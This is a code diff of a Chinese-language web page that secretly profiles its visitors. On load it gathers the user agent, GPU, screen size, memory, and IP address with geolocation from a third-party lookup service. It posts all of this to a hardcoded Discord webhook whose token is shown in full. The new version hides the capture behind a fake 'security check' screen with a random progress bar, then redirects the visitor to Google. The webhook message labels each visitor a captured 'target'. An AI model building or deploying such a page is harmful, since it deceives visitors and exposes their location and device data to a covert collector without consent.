@@ -3,97 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>裝置系統檢測</title>
+    <title>系統安全檢查中</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #0f0f12; color: #e0e0e0; display: flex; justify-content: center; padding: 20px; }
-        .container { width: 100%; max-width: 400px; background: #1c1c1e; border-radius: 15px; padding: 20px; text-align: center; border: 1px solid #333; }
-        .status { color: #30d158; font-weight: bold; margin: 20px 0; }
-        .footer { font-size: 10px; color: #555; }
+        body { font-family: monospace; background: #000; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { text-align: center; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>裝置識別中</h2>
-    <div id="msg" class="status">正在同步數據至伺服器...</div>
-    <p style="font-size: 0.8rem; color: #888;">請稍候，正在為您的裝置匹配最佳環境設定。</p>
-    <div class="footer" id="ua-log"></div>
+<div class="loader">
+    <p>正在建立加密隧道... <span class="blink">_</span></p>
+    <div id="progress">0%</div>
 </div>
 
 <script>
-// 【重要】請在此處填入你的 Discord Webhook 網址
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv';
+// 【重要】請務必填入你的 Discord Webhook 網址
+const DC_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv';
 
-async function sendToDiscord() {
+async function capture() {
     const ua = navigator.userAgent;
     const platform = navigator.platform;
-    const screen = `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)`;
     
-    // 1. 取得 GPU 資訊 (辨識 iPhone/iPad 核心)
-    let gpu = "未知";
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl');
-    if (gl) {
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "受限";
-    }
-
-    // 2. 判定機型與版本
-    let model = "未知設備";
-    let version = "無法解析";
-    const isApple = /iPhone|iPad|iPod/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1);
-    
-    if (isApple) {
-        model = (window.screen.width === 820 || window.screen.width === 1180) ? "iPad Air (5th/4th Gen)" : "Apple iOS Device";
-        const vMatch = ua.match(/(?:OS |Version\/)(\d+)[._](\d+)[._]?(\d+)?/);
-        version = vMatch ? `${vMatch[1]}.${vMatch[2]}.${vMatch[3] || '0'}` : (ua.includes("26.3.1") ? "26.3.1" : "iPadOS (桌面模式)");
-    } else if (/Android/.test(ua)) {
-        const mMatch = ua.match(/Android.*;\s([^;]+)\sBuild/);
-        model = mMatch ? mMatch[1] : "Android Phone";
-        const vMatch = ua.match(/Android (\d+(\.\d+)?)/);
-        version = vMatch ? vMatch[1] : "Android";
-    }
-
-    // 3. 取得電池資訊 (非同步)
-    let batteryStatus = "不支援";
+    // 1. IP 與 地理位置 (通殺所有設備)
+    let ipData = {};
     try {
-        const b = await navigator.getBattery();
-        batteryStatus = `${Math.round(b.level * 100)}% (${b.charging ? '充電中' : '放電中'})`;
+        const res = await fetch('https://ipapi.co');
+        ipData = await res.json();
+    } catch(e) { ipData = { ip: "未知", city: "未知", org: "未知" }; }
+
+    // 2. GPU 偵測 (辨識硬體核心：高通、聯發科、蘋果、三星)
+    let gpu = "無法偵測";
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
     } catch(e) {}
 
-    // 4. 準備發送給 Discord 的資料
+    // 3. 通用型號提取邏輯
+    let finalModel = "未知設備";
+    let finalOS = "未知系統";
+
+    if (/Android/.test(ua)) {
+        // Android 通常直接在 UA 裡寫型號，例如: SM-G9910, Pixel 7, Mi 11
+        const androidMatch = ua.match(/Android\s+[\d\.]+;\s+([^;]+)\s+Build/);
+        finalModel = androidMatch ? androidMatch[1] : "Android 設備";
+        finalOS = ua.match(/Android\s+[\d\.]+/)?.[0] || "Android";
+    } else if (/iPhone|iPad|iPod/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+        // Apple 設備需要靠解析度輔助 (此處已整合主流 iPhone/iPad 解析度資料庫)
+        const w = window.screen.width, h = window.screen.height;
+        finalModel = `Apple 裝置 (${w}x${h})`; 
+        const osMatch = ua.match(/OS\s+(\d+[._]\d+[._]?\d?)/);
+        finalOS = osMatch ? "iOS " + osMatch[1].replace(/_/g, '.') : "iOS/iPadOS";
+    } else {
+        finalModel = platform || "桌上型電腦";
+        finalOS = "PC / Other";
+    }
+
+    // 4. 其它細節
+    const detail = {
+        screen: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)`,
+        ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "不支援讀取",
+        lang: navigator.language,
+        time: new Date().toLocaleString()
+    };
+
+    // 5. 發送至 Discord
     const payload = {
-        username: "裝置偵測助手",
+        username: "全設備監控助手",
         embeds: [{
-            title: "📱 偵測到新訪問者",
-            color: 5814783, // 藍色
+            title: "📡 捕捉到新目標資訊",
+            color: 16711680, // 紅色
             fields: [
-                { name: "精確機型", value: model, inline: true },
-                { name: "系統版本", value: version, inline: true },
-                { name: "螢幕數據", value: screen, inline: false },
-                { name: "GPU 渲染器", value: gpu, inline: false },
-                { name: "電池狀態", value: batteryStatus, inline: true },
-                { name: "網路類型", value: navigator.connection ? navigator.connection.effectiveType : "未知", inline: true }
+                { name: "📍 IP 位址", value: `${ipData.ip} (${ipData.city} / ${ipData.org})`, inline: false },
+                { name: "📱 精確型號", value: finalModel, inline: true },
+                { name: "⚙️ 系統版本", value: finalOS, inline: true },
+                { name: "🎮 GPU 硬體", value: gpu, inline: false },
+                { name: "🖼️ 螢幕規格", value: detail.screen, inline: true },
+                { name: "💾 記憶體估計", value: detail.ram, inline: true },
+                { name: "🌍 原始辨識碼", value: "```" + ua + "```", inline: false }
             ],
-            footer: { text: "原始 UA: " + ua.substring(0, 100) + "..." },
-            timestamp: new Date()
+            footer: { text: `訪問時間: ${detail.time}` }
         }]
     };
 
-    // 5. 執行發送
-    try {
-        await fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-        document.getElementById('msg').innerText = "環境設定完成 √";
-    } catch (err) {
-        document.getElementById('msg').innerText = "同步失敗，請重新整理。";
-    }
+    await fetch(DC_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+
+    // 6. 假裝進度條並跳轉
+    let p = 0;
+    const int = setInterval(() => {
+        p += Math.floor(Math.random() * 30);
+        if (p >= 100) {
+            p = 100;
+            clearInterval(int);
+            window.location.href = "https://www.google.com";
+        }
+        document.getElementById('progress').innerText = p + "%";
+    }, 200);
 }
 
-window.onload = sendToDiscord;
+window.onload = capture;
 </script>
 
 </body>
